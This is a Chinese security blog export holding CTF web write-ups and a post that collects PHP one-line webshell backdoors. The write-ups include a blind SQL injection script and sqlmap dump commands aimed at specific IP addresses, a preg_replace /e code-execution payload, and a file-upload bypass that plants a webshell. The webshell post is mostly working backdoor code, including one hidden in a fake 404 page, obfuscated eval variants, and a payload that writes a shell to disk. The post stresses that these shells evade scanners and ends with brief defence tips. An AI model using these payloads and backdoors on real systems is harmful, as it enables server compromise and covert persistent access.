GET方式给s赋一个值，使s不等于a且s的md5值等于a的md5值,这里的==弱类型比较只会比较变量的内容并不会比较变量类型。题中所给的$a的MD5值是0e开头的，这就导致php将它解析为科学计数法，所以我们只需再找一个MD5加密以0e开头的字符串即可payload: ?s&#x3D;s878926199a An easy SQLi 2万能密码username:&#39;or 1=1，密码随便输，出flag 头啊头哇首先赋值get&#x3D;flag，然后会提示“必须使用IceRabbit浏览器”，改代理为IceRabbit Browser,接着会提示“你从google来吗？”，改Referer为www.google.comgetflag 唯快不破?打开链接可以看到网页进行了多次跳转，利用python抓取页面就行了，将三个页面信息拼接得到flag php反序列化主页给了源码 12345678910111213141516171819202122232425262728293031&lt;?phperror_reporting(0);class hack&#123; public $mod1; public function __destruct() &#123; $this-&gt;mod1 = &quot;concat string&quot;.$this-&gt;mod1; &#125;&#125;class str&#123; public $str1; public function __toString() &#123; $this-&gt;str1-&gt;flag(); return &quot;1&quot;; &#125;&#125;class get_flag&#123; public function flag() &#123; echo &quot;tql, 缁欏笀鍌呴€抐lag:&quot;.&quot;nwuctf&#123;xxxxxxxxxxxxxxx&#125;&quot;; &#125;&#125;$a = $_GET[&#x27;string&#x27;];unserialize($a);highlight_file(__FILE__);?&gt; 构造pop链，flag可以通过str类的 __ toString方法输出。该方法会在类被当做字符串的时候自动调用，所以自然而然想到利用hack类中的__destruct payload代码 12345678910111213141516171819202122232425262728293031&lt;?phpclass hack&#123; public $mod1; public function __construct() &#123; $this-&gt;mod1 = new str; &#125;&#125;class str&#123; public $str1; public function __construct() &#123; $this-&gt;str1 = new get_flag; &#125;&#125;class get_flag&#123; public function flag() &#123; echo &quot;tql, 缁欏笀鍌呴€抐lag:&quot;.&quot;nwuctf&#123;xxxxxxxxxxxxxxx&#125;&quot;; &#125;&#125;$a = new hack;$b = serialize($a);echo $b;?&gt; payload: string&#x3D;O:4:%22hack%22:1:{s:4:%22mod1%22;O:3:%22str%22:1:{s:4:%22str1%22;O:8:%22get_flag%22:0:{}}} 如果还有如果题目给了源码 1234567891011121314151617181920212223242526272829303132 &lt;?php$flag=&quot;nwuctf&#123;xxxxxxxxxxxxxxxxxxxx&#125;&quot;;if (!empty($_SERVER[&#x27;QUERY_STRING&#x27;])) &#123; $query = $_SERVER[&#x27;QUERY_STRING&#x27;]; $res = parse_str($query); if (!empty($res[&#x27;action&#x27;]))&#123; $action = $res[&#x27;action&#x27;]; &#125;&#125;if ($action === &#x27;auth&#x27;) &#123; if (!empty($res[&#x27;user&#x27;])) &#123; $user = $res[&#x27;user&#x27;]; &#125; if (!empty($res[&#x27;pass&#x27;])) &#123; $pass = $res[&#x27;pass&#x27;]; &#125; if (!empty($user) &amp;&amp; !empty($pass)) &#123; $hashed_password = hash(&#x27;md5&#x27;, $user.$pass); &#125; if (!empty($hashed_password) &amp;&amp; $hashed_password === &#x27;22180f07c8d8de04667257a18d9a64c6&#x27;) &#123; echo $flag; &#125; else &#123; echo &#x27;fail :(&#x27;; &#125;&#125;else &#123; highlight_file(__FILE__);&#125; 利用parse_str函数覆盖变量hashed_password的值 payload: action&#x3D;auth&amp;hashed_password&#x3D;22180f07c8d8de04667257a18d9a64c6 An easy SQLi挺简单的，直接上sqlmap跑 sql注入漏洞sqlmap不是万能的╥﹏╥，只能靠自己手动注入了，简单测试了一下拦截了以下关键词order | left | mid | substr | like | = | %23(#)|ascii那就用right|regexp|--+进行注入吧~利用BP抓包并爆破?部分，突然发现MySQL不区分大小写？？？WTF！一路走来爆到不明大小写的库名、表名、列名、字段，很崩溃！因为过滤掉了ascii和ord，在网上也没找到什么有用的相关资料，于是直接去找出题人聊了聊。他说这大小写并不是自己想要考察的点，只是无奈之下的一个非预期效果……好吧 Orz。然后他甩给我一个链接。只要加入关键词binary就行了。 爆库 id&#x3D;1’ and right(database(),1) regexp binary ‘§?§’ –+ 爆表 id&#x3D;1’ and right((select group_concat(table_name) from information_schema.tables where table_schema regexp “ctf”),1) regexp binary ‘§?§’ –+ 爆列 id&#x3D;1’ and right((select group_concat(column_name) from information_schema.columns where table_name regexp “fla49”),1) regexp ‘§?§’ –+ 爆段的最后一步 id&#x3D;1’ and right((select group_concat(flag) from fla49),29) regexp binary ‘§?§wuctf{Her3_is_SQLi_FlaggQWQ}’ –+ 当然也可以用脚本跑下面附上我写的脚本： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384import requests as rdic = &#x27;_&#123;&#125;-+abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#x27;def Database(): global db_name db_name = &#x27;&#x27; flag1 = 0 for i in range(1,50): for j in dic: url1 = &#x27;http://123.207.166.65/nwuctf/zfgbhjyuk.php?id=1\\&#x27; and right(database(),&#x27;+str(i)+&#x27;) regexp binary \\&#x27;&#x27;+j+db_name+&#x27;\\&#x27; --+&#x27; #print(url1) res1 = r.get(url1) if &#x27;hello&#x27; in res1.text: db_name = j+db_name print(db_name) break if j == &#x27;9&#x27;: flag1 = 1 if flag1 == 1: print(&#x27;Database --&gt; &#x27;+db_name) breakdef Table(): global ta_name ta_name = &#x27;&#x27; flag2 = 0 for i in range(1,50): for j in dic: url2 = &#x27;http://123.207.166.65/nwuctf/zfgbhjyuk.php?id=1\\&#x27; and right((select group_concat(table_name) from information_schema.tables where table_schema regexp &quot;&#x27;+db_name+&#x27;&quot;),&#x27;+str(i)+&#x27;) regexp binary \\&#x27;&#x27;+j+ta_name+&#x27;\\&#x27; --+&#x27; #print(url2) res2 = r.get(url2) if &#x27;hello&#x27; in res2.text: ta_name = j+ta_name print(ta_name) break if j == &#x27;9&#x27;: flag2 = 1 if flag2 == 1: print(&#x27;Table_name --&gt; &#x27;+ta_name) breakdef Column(): global co_name co_name = &#x27;&#x27; flag3 = 0 for i in range(1,50): for j in dic: url3 = &#x27;http://123.207.166.65/nwuctf/zfgbhjyuk.php?id=1\\&#x27; and right((select group_concat(column_name) from information_schema.columns where table_name regexp &quot;&#x27;+ta_name+&#x27;&quot;),&#x27;+str(i)+&#x27;) regexp \\&#x27;&#x27;+j+co_name+&#x27;\\&#x27; --+&#x27; #print(url3) res3 = r.get(url3) if &#x27;hello&#x27; in res3.text: co_name = j+co_name print(co_name) break if j == &#x27;9&#x27;: flag3 =1 if flag3 == 1: print(&#x27;Column_name --&gt; &#x27;+co_name) breakdef Flag(): flag = &#x27;&#x27; flag4 = 0 for i in range(1,50): for j in dic: url4 = &#x27;http://123.207.166.65/nwuctf/zfgbhjyuk.php?id=1\\&#x27; and right((select group_concat(&#x27;+co_name+&#x27;) from &#x27;+ta_name+&#x27;),&#x27;+str(i)+&#x27;) regexp binary \\&#x27;&#x27;+j+flag+&#x27;\\&#x27; --+&#x27; #print(url4) res4 = r.get(url4) if &#x27;hello&#x27; in res4.text: flag = j+flag print(flag) break if j == &#x27;9&#x27;: flag4 = 1 if flag4 == 1: print(&#x27;flag --&gt; &#x27;+flag) breakif __name__ == &#x27;__main__&#x27;: Database() Table() Column() Flag() 被SQL玩的团团转。。。卒","comments":true,"tags":[{"name":"Writeup","slug":"Writeup","permalink":"http://www.cryscat.com/tags/Writeup/"},{"name":"Web","slug":"Web","permalink":"http://www.cryscat.com/tags/Web/"},{"name":"moeCTF","slug":"moeCTF","permalink":"http://www.cryscat.com/tags/moeCTF/"}]},{"title":"赛博地球杯网安大赛web部分Writeup","date":"2019-03-03T09:44:35.000Z","path":"2019/03/03/赛博地球杯网安大赛web部分Writeup/","text":"0X00 前言菜却坚强…… 0X01 大量设备报表不见了脑洞题…看到这个url首先想到sql注入，但是一顿乱锤毫无进展，看来不是sql注入 爆破id试试 id&#x3D;2333时爆出flag 0X02 工控管理系统新版本大致浏览一下有login.php，regist.php，findpwd.php这三个页面在findpwd.php页面发现搜索框存在sql注入并且fuzz测试无任何过滤，直接上sqlmap吧，懒得动手了 爆数据库名：cetc004 sqlmap -u http://111.198.29.45:32509/findpwd.php –data “username&#x3D;1” –dbs 爆表名：user sqlmap -u http://111.198.29.45:32509/findpwd.php –data “username&#x3D;1” -D cetc004 –tables 爆列名：answer,password,question,username sqlmap -u http://111.198.29.45:32509/findpwd.php –data “username&#x3D;1” -D cetc004 -T user –columns 爆内容：没想多少干脆全爆出来，愣是跑了近一个小时，后悔了……其实只要将username爆出来就行了，密码是md5加密的，到处解没解出来 sqlmap -u http://111.198.29.45:32509/findpwd.php –data “username&#x3D;1” -D cetc004 -T user -C “answer,password,question,username” –dump 后两条信息是我创的，第一条是原本的网站管理账号，只要用管理账号的用户名再去注册一个账号再登录进去就能getflag了 0X03 工控云管理系统设备维护中心被植入后门http://111.198.29.45:32548/index.php?page=index看到这url第一反应就是文件包含 http://111.198.29.45:32548/index.php?page=php://filter/read=convert.base64-encode/resource=index.php 拿去base64解密关键部分代码： 123456789101112131415161718&lt;?php//方便的实现输入输出的功能,正在开发中的功能，只能内部人员测试if ($_SERVER[&#x27;HTTP_X_FORWARDED_FOR&#x27;] === &#x27;127.0.0.1&#x27;) &#123; echo &quot;&lt;br &gt;Welcome My Admin ! &lt;br &gt;&quot;; $pattern = $_GET[pat]; $replacement = $_GET[rep]; $subject = $_GET[sub]; if (isset($pattern) &amp;&amp; isset($replacement) &amp;&amp; isset($subject)) &#123; preg_replace($pattern, $replacement, $subject); &#125;else&#123; die(); &#125;&#125;?&gt; 代码审计可知要将XFF改为127.0.0.1才能触发后门。这是一个preg_replace()后门。&#x2F;e 修正符使 preg_replace() 将 replacement 参数当作 PHP 代码（在适当的逆向引用替换完之后）。但要确保 replacement 构成一个合法的 PHP 代码字符串，否则 PHP 会在报告在包含preg_replace() 的行中出现语法解析错误。payload: pat&#x3D;&#x2F;a&#x2F;e&amp;rep&#x3D;phpinfo()&amp;sub&#x3D;a 之后可以通过system()等函数命令执行 pat&#x3D;&#x2F;a&#x2F;e&amp;rep&#x3D;system(“cat s3chahahaDir&#x2F;flag&#x2F;flag.php”)&amp;sub&#x3D;a 查看源代码getflag 0X04 工控云管理系统项目管理页面解析漏洞题目给了源代码： 123456789101112131415161718&lt;?php if (isset($_GET[id]) &amp;&amp; floatval($_GET[id]) !== &#x27;1&#x27; &amp;&amp; substr($_GET[id], -1) === &#x27;9&#x27;) &#123; include &#x27;config.php&#x27;; $id = mysql_real_escape_string($_GET[id]); $sql=&quot;select * from cetc007.user where id=&#x27;$id&#x27;&quot;; $result = mysql_query($sql); $result = mysql_fetch_object($result); &#125; else &#123; $result = False; die(); &#125; if(!$result)die(&quot;&lt;br &gt;something wae wrong ! &lt;br&gt;&quot;); if($result)&#123; echo &quot;id: &quot;.$result-&gt;id.&quot;&lt;/br&gt;&quot;; echo &quot;name:&quot;.$result-&gt;user.&quot;&lt;/br&gt;&quot;; $_SESSION[&#x27;admin&#x27;] = True; &#125;?&gt; 在这一段代码中我们需要绕过if (isset($_GET[id]) &amp;&amp; floatval($_GET[id]) !== &#39;1&#39; &amp;&amp; substr($_GET[id], -1) === &#39;9&#39;)使$_SESSION[&#39;admin&#39;] = True。此外还有一个隐藏的限制：mysql查询结果的限制，id大了查询不到。我们可以构造id=1\\09来绕过这部分限制。 第二部分代码： 123456789101112131415&lt;?php if ($_SESSION[&#x27;admin&#x27;]) &#123; $con = $_POST[&#x27;con&#x27;]; $file = $_POST[&#x27;file&#x27;]; $filename = &quot;backup/&quot;.$file; if(preg_match(&#x27;/.+\\.ph(p[3457]?|t|tml)$/i&#x27;, $filename))&#123; die(&quot;Bad file extension&quot;); &#125;else&#123; chdir(&#x27;uploaded&#x27;); $f = fopen($filename, &#x27;w&#x27;); fwrite($f, $con); fclose($f); &#125; &#125; ?&gt; 这里的$filename = &quot;backup/&quot;.$file;目录为假目录需要绕过。 正则表达式if(preg_match(&#39;/.+\\.ph(p[3457]?|t|tml)$/i&#39;, $filename))对文件后缀进行过滤 真实的上传目录为uploaded我们可以通过$file加..&#x2F;绕过假目录。正则匹配只匹配最后一个点的后缀，可以通过../cryscat.php/1.php/..绕过。 payload(post) con&#x3D;&amp;file&#x3D;..&#x2F;cryscat.php&#x2F;1.php&#x2F;.. 之后用菜刀连接就行了，flag在html文件夹的flag.php文件中。","comments":true,"tags":[{"name":"Writeup","slug":"Writeup","permalink":"http://www.cryscat.com/tags/Writeup/"},{"name":"XCTF","slug":"XCTF","permalink":"http://www.cryscat.com/tags/XCTF/"}]},{"title":"那些强悍的PHP一句话后门","date":"2019-01-02T14:58:44.000Z","path":"2019/01/02/那些强悍的PHP一句话后门/","text":"强悍的PHP一句话后门这类后门让网站、服务器管理员很是头疼，经常要换着方法进行各种检测，而很多新出现的编写技术，用普通的检测方法是没法发现并处理的。今天我们细数一些有意思的PHP一句话木马。 利用404页面隐藏PHP小马：1234567891011&lt;!DOCTYPE HTML PUBLIC &quot;-//IETF//DTD HTML 2.0//EN&quot;&gt;&lt;html&gt;&lt;head&gt;&lt;title&gt;404 Not Found&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;h1&gt;Not Found&lt;/h1&gt;&lt;p&gt;The requested URL was not found on this server.&lt;/p&gt;&lt;/body&gt;&lt;/html&gt;&lt;?php@preg_replace(&quot;/[pageerror]/e&quot;,$_POST[&#x27;error&#x27;],&quot;saft&quot;);header(&#x27;HTTP/1.1 404 Not Found&#x27;);?&gt; 404页面是网站常用的文件，一般建好后很少有人会去对它进行检查修改，这时我们可以利用这一点进行隐藏后门。 无特征隐藏PHP一句话：1234&lt;?phpsession_start();$_POST[&#x27;code&#x27;] &amp;&amp; $_SESSION[&#x27;theCode&#x27;] = trim($_POST[&#x27;code&#x27;]);$_SESSION[&#x27;theCode&#x27;]&amp;&amp;preg_replace(&#x27;\\&#x27;a\\&#x27;eis&#x27;,&#x27;e&#x27;.&#x27;v&#x27;.&#x27;a&#x27;.&#x27;l&#x27;.&#x27;(base64_decode($_SESSION[\\&#x27;theCode\\&#x27;]))&#x27;,&#x27;a&#x27;); 将$_POST[&#39;code&#39;]的内容赋值给$_SESSION[&#39;theCode&#39;]，然后执行$_SESSION[&#39;theCode&#39;]，亮点是没有特征码。用扫描工具来检查代码的话，是不会报警的，达到目的了。 超级隐蔽的PHP后门：1&lt;?php $_GET[a]($_GET[b]);?&gt; 仅用GET函数就构成了木马利用方法： ?a&#x3D;assert&amp;b&#x3D;${fputs%28fopen%28base64_decode%28Yy5waHA%29,w%29,base64_decode%28PD9waHAgQGV2YWwoJF9QT1NUW2NdKTsgPz4x%29%29}; 执行后当前目录生成c.php一句话木马，当传参a为eval时会报错木马生成失败，为assert时同样报错，但会生成木马，真可谓不可小视，简简单单的一句话，被延伸到这般应用。 层级请求，编码运行PHP后门：此方法用两个文件实现，文件1 1234567&lt;?php//1.phpheader(&#x27;Content-type:text/html;charset=utf-8&#x27;);parse_str($_SERVER[&#x27;HTTP_REFERER&#x27;], $a);if(reset($a) == &#x27;10&#x27; &amp;&amp; count($a) == 9) &#123; eval(base64_decode(str_replace(&quot; &quot;, &quot;+&quot;, implode(array_slice($a, 6)))));&#125; 文件2 12345678910111213141516171819202122&lt;?php//2.phpheader(&#x27;Content-type:text/html;charset=utf-8&#x27;);//要执行的代码$code = &lt;&lt;&lt;CODEphpinfo();CODE;//进行base64编码$code = base64_encode($code);//构造referer字符串$referer = &quot;a=10&amp;b=ab&amp;c=34&amp;d=re&amp;e=32&amp;f=km&amp;g=&#123;$code&#125;&amp;h=&amp;i=&quot;;//后门url$url = &#x27;http://localhost/test1/1.php&#x27;;$ch = curl_init();$options = array( CURLOPT_URL =&gt; $url, CURLOPT_HEADER =&gt; FALSE, CURLOPT_RETURNTRANSFER =&gt; TRUE, CURLOPT_REFERER =&gt; $referer);curl_setopt_array($ch, $options);echo curl_exec($ch); 通过HTTP请求中的HTTP_REFERER来运行经过base64编码的代码，来达到后门的效果，一般waf对referer这些检测要松一点，或者没有检测。用这个思路bypass waf不错。 PHP后门生成工具weevelyweevely是一款针对PHP的webshell的自由软件，可用于模拟一个类似于telnet的连接shell，weevely通常用于web程序的漏洞利用，隐藏后门或者使用类似telnet的方式来代替web 页面式的管理，weevely生成的服务器端php代码是经过了base64编码的，所以可以骗过主流的杀毒软件和IDS，上传服务器端代码后通常可以通过weevely直接运行。 weevely所生成的PHP后门所使用的方法是现在比较主流的base64加密结合字符串变形技术，后门中所使用的函数均是常用的字符串处理函数，被作为检查规则的eval，system等函数都不会直接出现在代码中，从而可以致使后门文件绕过后门查找工具的检查。使用暗组的Web后门查杀工具进行扫描，结果显示该文件无任何威胁。 那些强悍的PHP一句话后门三个变形的一句话PHP木马第一个 1&lt;?php ($_=@$_GET[2]).@$_($_POST[1])?&gt; 在菜刀里写http://site/1.php?2=assert密码是1 第二个 1234567&lt;?php$_=&quot;&quot;;$_[+&quot;&quot;]=&#x27;&#x27;;$_=&quot;$_&quot;.&quot;&quot;;$_=($_[+&quot;&quot;]|&quot;\u0006&quot;).($_[+&quot;&quot;]|&quot;&quot;).($_[+&quot;&quot;]^&quot;\u0015&quot;);?&gt;&lt;?php $&#123;&#x27;_&#x27;.$_&#125;[&#x27;_&#x27;]($&#123;&#x27;_&#x27;.$_&#125;[&#x27;__&#x27;]);?&gt; 在菜刀里写http://site/2.php?_=assert&amp;__=eval($_POST[&#39;pass&#39;]) 密码是pass。如果你用菜刀的附加数据的话更隐蔽，或者用其它注射工具也可以，因为是post提交的。 第三个 1($b4dboy = $_POST[&#x27;b4dboy&#x27;]) &amp;&amp; @preg_replace(&#x27;/ad/e&#x27;,&#x27;@&#x27;.str_rot13(&#x27;riny&#x27;).&#x27;($b4dboy)&#x27;, &#x27;add&#x27;); str_rot13(‘riny’)即编码后的eval，完全避开了关键字，又不失效果，让人吐血！ 最后列几个高级的PHP一句话木马后门：1234567891011121314151617181920212223242526272829303132333435363738394041421、$hh = &quot;p&quot;.&quot;r&quot;.&quot;e&quot;.&quot;g&quot;.&quot;_&quot;.&quot;r&quot;.&quot;e&quot;.&quot;p&quot;.&quot;l&quot;.&quot;a&quot;.&quot;c&quot;.&quot;e&quot;;$hh(&quot;/[discuz]/e&quot;,$_POST[&#x27;h&#x27;],&quot;Access&quot;);//菜刀一句话2、$filename=$_GET[&#x27;xbid&#x27;];include ($filename);//危险的include函数，直接编译任何文件为php格式运行3、$reg=&quot;c&quot;.&quot;o&quot;.&quot;p&quot;.&quot;y&quot;;$reg($_FILES[MyFile][tmp_name],$_FILES[MyFile][name]);//重命名任何文件4、$gzid = &quot;p&quot;.&quot;r&quot;.&quot;e&quot;.&quot;g&quot;.&quot;_&quot;.&quot;r&quot;.&quot;e&quot;.&quot;p&quot;.&quot;l&quot;.&quot;a&quot;.&quot;c&quot;.&quot;e&quot;;$gzid(&quot;/[discuz]/e&quot;,$_POST[&#x27;h&#x27;],&quot;Access&quot;);//菜刀一句话5、include ($uid);//危险的include函数，直接编译任何文件为php格式运行，POST www.xxx.com/index.php?uid=/home/www/bbs/image.gif//gif插一句话6、典型一句话程序后门代码&lt;?php eval_r($_POST[sb])?&gt;程序代码&lt;?php @eval_r($_POST[sb])?&gt;//容错代码程序代码&lt;?php assert($_POST[sb]);?&gt;//使用lanker一句话客户端的专家模式执行相关的php语句程序代码&lt;?$_POST[&#x27;sa&#x27;]($_POST[&#x27;sb&#x27;]);?&gt;程序代码&lt;?$_POST[&#x27;sa&#x27;]($_POST[&#x27;sb&#x27;],$_POST[&#x27;sc&#x27;])?&gt;程序代码&lt;?php@preg_replace(&quot;/[email]/e&quot;,$_POST[&#x27;h&#x27;],&quot;error&quot;);?&gt;//使用这个后,使用菜刀一句话客户端在配置连接的时候在&quot;配置&quot;一栏输入程序代码&lt;O&gt;h=@eval_r($_POST1);&lt;/O&gt;程序代码&lt;script language=&quot;php&quot;&gt;@eval_r($_POST[sb])&lt;/script&gt;//绕过&lt;?限制的一句话 综上，这些PHP一句话后门可谓五脏俱全，一不小心您肯定中招了，而我们今天这篇文章的重中之重在哪呢？重点就在下边的总结! 如何应对PHP一句话后门：我们强调几个关键点，看这文章的你相信不是门外汉，我也就不啰嗦了： 1.对PHP程序编写要有安全意识2.服务器日志文件要经常看，经常备份3.对每个站点进行严格的权限分配4.对动态文件及目录经常批量安全审查5.学会如何进行手工杀毒《即行为判断查杀》6.时刻关注，或渗入活跃的网络安全营地7.对服务器环境层级化处理，哪怕一个函数也可做规则 我们认为当管理的站点多了，数据量大时，我们应合理应用一些辅助工具，但不应完全依赖这些工具，技术是时刻在更新进步的，最为重要的是你应学会和理解，编写这些强悍后门的人所处思维，角色上的换位可为你带来更大的进步。 [+]原文","comments":true,"tags":[{"name":"php","slug":"php","permalink":"http://www.cryscat.com/tags/php/"},{"name":"webshell","slug":"webshell","permalink":"http://www.cryscat.com/tags/webshell/"}]}]